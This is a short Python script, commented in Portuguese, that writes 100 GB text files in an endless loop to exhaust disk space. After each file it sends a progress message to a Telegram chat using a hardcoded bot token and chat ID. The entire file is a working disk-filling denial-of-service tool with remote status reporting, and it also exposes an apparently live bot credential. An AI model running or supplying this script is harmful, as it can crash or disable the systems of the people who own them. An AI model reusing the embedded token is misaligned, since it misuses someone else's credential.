import os
import telebot

# Substitua pelo seu token e ID de chat
bot_token = "8047998280:AAFSw2DcVkGYfgsUldfpfYr8yc6G9dgpt9o"
chat_id = 6572589301

# Inicializa o bot
bot = telebot.TeleBot(bot_token)

def send_telegram_message(message):
    bot.send_message(chat_id, message)

def create_large_files():
    file_count = 0
    target_size = 100 * 1024 * 1024 * 1024  # 100 GB em bytes
    content = "Esta é uma linha de texto.\n" * 1000  # Mensagem repetida

    while True:
        file_count += 1
        filename = f"large_file_{file_count}.txt"
        with open(filename, 'w') as f:
            while os.path.getsize(filename) < target_size:
                f.write(content)
        
        file_size = os.path.getsize(filename)
        success_message = f"Arquivo {filename} criado com tamanho {file_size / (1024 * 1024 * 1024):.2f} GB."
        print(success_message)

        # Enviar mensagem para o Telegram
        send_telegram_message(success_message)

if __name__ == "__main__":
    create_large_files()
